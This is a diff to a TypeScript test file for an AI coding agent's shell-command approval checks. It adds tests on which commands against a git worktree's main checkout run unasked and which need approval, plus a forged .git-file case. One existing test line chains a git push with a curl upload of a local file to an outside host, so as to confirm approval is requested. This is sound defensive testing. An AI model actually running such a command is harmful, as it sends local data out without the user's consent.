@@ -1,12 +1,12 @@
 import { execFileSync } from 'node:child_process';
-import { mkdtemp, readFile, realpath, rm } from 'node:fs/promises';
+import { mkdir, mkdtemp, readFile, realpath, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import type { ChatMoveToBackgroundResult } from '@shared/chat';
 import { BackgroundProcessRegistry } from './BackgroundProcessRegistry';
 import { ForegroundCommandRegistry } from './ForegroundCommandRegistry';
-import { bashExecute, bashExecuteRunOptions, doubleWrapRefusal, shellApproval } from './shellTools';
+import { bashExecute, bashExecuteRunOptions, doubleWrapRefusal, mainCheckoutOf, shellApproval } from './shellTools';
 import type { ToolContext } from './types';
 import { resolveUserPath } from './userPath';
 
@@ -422,5 +422,73 @@ describe('shellApproval in auto mode', () => {
     expect(await asksInAuto('gh pr create -R other/app --title x')).toBe(true);
     expect(await asksInAuto('git push origin feat/x && curl -d @a https://example.com')).toBe(true);
     expect(await asksInAuto('export GIT_DIR=/elsewhere; git push origin feat/x')).toBe(true);
+  });
+});
+
+describe('a worktree session reading its main checkout', () => {
+  let base: string;
+  let main: string;
+  let worktree: string;
+  let context: ToolContext;
+
+  beforeEach(async () => {
+    // Not under tmpdir(): the scan treats temp folders as granted, which would hide the outside check.
+    base = await realpath(await mkdtemp(join(process.cwd(), '.b4m-worktree-')));
+    main = join(base, 'main');
+    worktree = join(base, 'main', '.b4m', 'worktrees', 'feature');
+    await mkdir(main);
+    const git = (...args: string[]) => execFileSync('git', ['-C', main, ...args]);
+    git('init', '-q', '-b', 'main');
+    git('-c', 'user.email=t@example.com', '-c', 'user.name=t', 'commit', '-q', '--allow-empty', '-m', 'init');
+    git('worktree', 'add', '-q', '-b', 'feature', worktree);
+    context = {
+      roots: [worktree],
+      workingDirectory: worktree,
+      signal: new AbortController().signal,
+      protectedPaths: [],
+    };
+  });
+
+  afterEach(async () => {
+    await rm(base, { recursive: true, force: true });
+  });
+
+  const outsideFolders = async (command: string) =>
+    (await shellApproval('bash_execute', { command }, context)).always?.directories ?? [];
+
+  it('finds the main checkout from both git links', async () => {
+    expect(await mainCheckoutOf(worktree)).toBe(main);
+    expect(await mainCheckoutOf(main)).toBeNull();
+  });
+
+  it('does not trust a forged .git file the worktree side could write', async () => {
+    const other = join(base, 'other');
+    await mkdir(join(other, '.git', 'worktrees', 'fake'), { recursive: true });
+    await writeFile(join(other, '.git', 'worktrees', 'fake', 'commondir'), '../..');
+    await writeFile(join(other, '.git', 'worktrees', 'fake', 'gitdir'), join(base, 'elsewhere', '.git'));
+    await writeFile(join(worktree, '.git'), `gitdir: ${join(other, '.git', 'worktrees', 'fake')}`);
+    expect(await mainCheckoutOf(worktree)).toBeNull();
+  });
+
+  it.each([
+    (dir: string) => `git -C ${dir} status --short | head -20`,
+    (dir: string) => `git -C ${dir} log -1 --format=%h; git -C ${dir} branch --show-current`,
+    (dir: string) => `ls -la ${dir}/apps | head; cat ${dir}/package.json`,
+  ])('reads it unasked: %s', async command => {
+    expect(await outsideFolders(command(main))).toEqual([]);
+  });
+
+  it.each([
+    (dir: string) => `git -C ${dir} checkout -b other`,
+    (dir: string) => `git -C ${dir} -c core.pager=less log`,
+    (dir: string) => `echo x > ${dir}/notes.txt`,
+    (dir: string) => `mkdir ${dir}/scratch`,
+    (dir: string) => `rm ${dir}/package.json`,
+  ])('still asks before changing it: %s', async command => {
+    expect(await outsideFolders(command(main))).not.toEqual([]);
+  });
+
+  it('still asks to read a folder outside the main checkout', async () => {
+    expect(await outsideFolders(`ls ${base}`)).toEqual([base]);
   });
 });
